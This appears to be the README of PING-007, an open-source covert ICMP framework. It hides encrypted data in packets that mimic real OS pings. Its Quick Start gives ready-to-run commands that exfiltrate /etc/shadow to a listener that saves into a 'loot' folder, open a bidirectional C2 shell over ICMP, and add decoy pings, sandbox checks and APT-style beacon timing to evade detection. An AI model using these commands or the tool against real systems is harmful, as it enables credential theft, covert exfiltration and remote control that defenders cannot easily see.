<div align="center">

<h1>PING-007</h1>
<p><em>Encrypted data inside packets byte-for-byte identical to a real OS ping.</em><br>
Covert ICMP framework - file exfiltration, C2 shell, timing profiles, OS signature mimicry.</p>

</div>

---

## About

PING-007 embeds encrypted payloads inside ICMP echo requests that are byte-for-byte identical to a real OS `ping` — same size, same TTL, same ICMP identifier, same sequence behavior, same payload pattern. Unlike existing ICMP tools (icmpsh, ptunnel, PingPull, Pingback), every packet conforms to the OS signature. Traffic is structurally indistinguishable from normal network diagnostics regardless of whether the observer has the key.

> Full technical write-up, wire format analysis, APT comparison, and detection research: **[franckferman.github.io/ping-007](https://franckferman.github.io/ping-007)**

---

## Installation

Pre-compiled binaries for Linux, macOS, and Windows (amd64/arm64) on the [releases page](https://github.com/franckferman/ping-007/releases).

**Build from source:**

```bash
git clone https://github.com/franckferman/ping-007
cd ping-007
make build           # standard (all features)
make build-no-c2     # exfil + listener only, shell excluded
make build-stealth   # stripped, obfuscated, PIE
make build-ghost     # maximum stripping
make build-all       # all platforms (linux/darwin/windows, amd64/arm64)
```

Requirements: Go 1.25+, `CAP_NET_RAW` (Linux/macOS) or Administrator (Windows).

> **Note:** CI releases the full build. For ops where C2 shell increases exposure, use `make build-no-c2`.

---

## Quick Start

```bash
# Send a message (stealth, encrypted)
sudo ./build/ping-007 basic -t 192.168.1.100 -d "hello" -p "key"

# Exfiltrate a file
sudo ./build/ping-007 exfil -t 192.168.1.100 -f /etc/shadow -p "key"

# Exfiltrate — fast mode, no inter-chunk delays
sudo ./build/ping-007 exfil -t 192.168.1.100 -f /etc/shadow -p "key" --mode fast

# Receive (listener side)
sudo ./build/ping-007 listen -o ./loot -p "key" --timeout 120

# Bidirectional C2 shell
sudo ./build/ping-007 listen -o /tmp/c2 -p "pass" --timeout 3600   # target
sudo ./build/ping-007 shell -t <TARGET_IP> -p "pass"                # operator

# Timing profiles — simulate nation-state beacon cadence
sudo ./build/ping-007 apt --list
sudo ./build/ping-007 apt -t 192.168.1.100 -r lazarus --duration 300 -p "key"

# Windows signature (40B frame, TTL 128)
sudo ./build/ping-007 basic -t 192.168.1.100 -d "hello" -p "key" --signature windows

# Decoy pings before + after to blend in
sudo ./build/ping-007 exfil -t 192.168.1.100 -f dump.bin -p "key" --decoy-pings 5 --after-pings 3
```

---

## Commands

```
ping-007 basic    - send a message (inline data, OS signature mimicry)
ping-007 stealth  - send with full evasion stack (sandbox check, adaptive timing, obfuscation)
ping-007 exfil    - exfiltrate a file in encrypted chunks
ping-007 shell    - bidirectional C2 shell over ICMP
ping-007 listen   - receive and decrypt incoming data
ping-007 apt      - timing profile simulation (lazarus / apt29 / apt28 / equation)
ping-007 analyze  - passive network analysis
ping-007 status   - framework health check
```

→ Full flag reference: [DOCUMENTATION.md — Flag Reference](https://github.com/franckferman/ping-007/blob/stable/DOCUMENTATION.md#2-flag-reference)

---

## Wire Format

Each ICMP echo request is structurally identical to a real OS ping:

| Signature | Frame | TTL | Payload | ICMP ID | Data zone |
|-----------|-------|-----|---------|---------|-----------|
| Linux | 64 B | 64 | 56 B — `[16B timeval][0x10,0x11…]` | `getpid() & 0xFFFF` | XOR'd into bytes 16–55 (38B usable) |
| Windows | 40 B | 128 | 32 B — `abcdefgh…` cycle | `0x0001` | XOR'd into all 32 bytes |

Sequence starts at 1, increments per packet. Encrypted data is XOR-embedded into the authentic OS pattern — from the wire, it looks like a standard ping regardless of the key.

→ Full format and steganography protocol: [DOCUMENTATION.md — OS Signature Profiles](https://github.com/franckferman/ping-007/blob/stable/DOCUMENTATION.md#4-os-signature-profiles)

---

## Crypto

Three AEAD algorithms with PBKDF2-SHA256 key derivation (100k iterations). Algorithm rotates on a configurable interval (default: 1h); receiver auto-detects from the 4-byte wire header.

| Algorithm | Auth | Salt |
|-----------|------|------|
| AES-256-GCM | AEAD | `ping007-aes-salt-v1` |
| ChaCha20-Poly1305 | AEAD | `ping007-chacha20-salt-v1` |
| XOR-CFB + HMAC-SHA256 | HMAC | `ping007-xor-salt-v1` |

→ Full crypto spec: [DOCUMENTATION.md — Cryptographic Details](https://github.com/franckferman/ping-007/blob/stable/DOCUMENTATION.md#7-cryptographic-details)

---

## License

Licensed under the GNU Affero General Public License v3.0. See [LICENSE](LICENSE) for full terms.

---

## Contact

[![ProtonMail][protonmail-shield]](mailto:contact@franckferman.fr)
[![LinkedIn][linkedin-shield]](https://www.linkedin.com/in/franckferman)
[![Twitter][twitter-shield]](https://www.twitter.com/franckferman)

[protonmail-shield]: https://img.shields.io/badge/ProtonMail-8B89CC?style=for-the-badge&logo=protonmail&logoColor=blueviolet
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=blue
[twitter-shield]: https://img.shields.io/badge/-Twitter-black.svg?style=for-the-badge&logo=twitter&colorB=blue
